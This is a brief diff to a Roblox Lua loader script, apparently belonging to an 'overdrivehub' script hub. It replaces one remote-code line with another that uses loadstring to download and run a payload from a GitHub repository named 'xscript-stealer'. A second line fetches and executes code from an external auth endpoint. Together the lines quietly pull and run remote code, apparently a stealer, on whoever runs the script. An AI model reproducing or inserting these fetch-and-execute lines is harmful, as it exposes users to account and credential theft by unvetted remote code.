@@ -1,5 +1,5 @@
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/46MUxdnv/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/xscript-stealer/refs/heads/main/base"))()
 end)
 
 loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
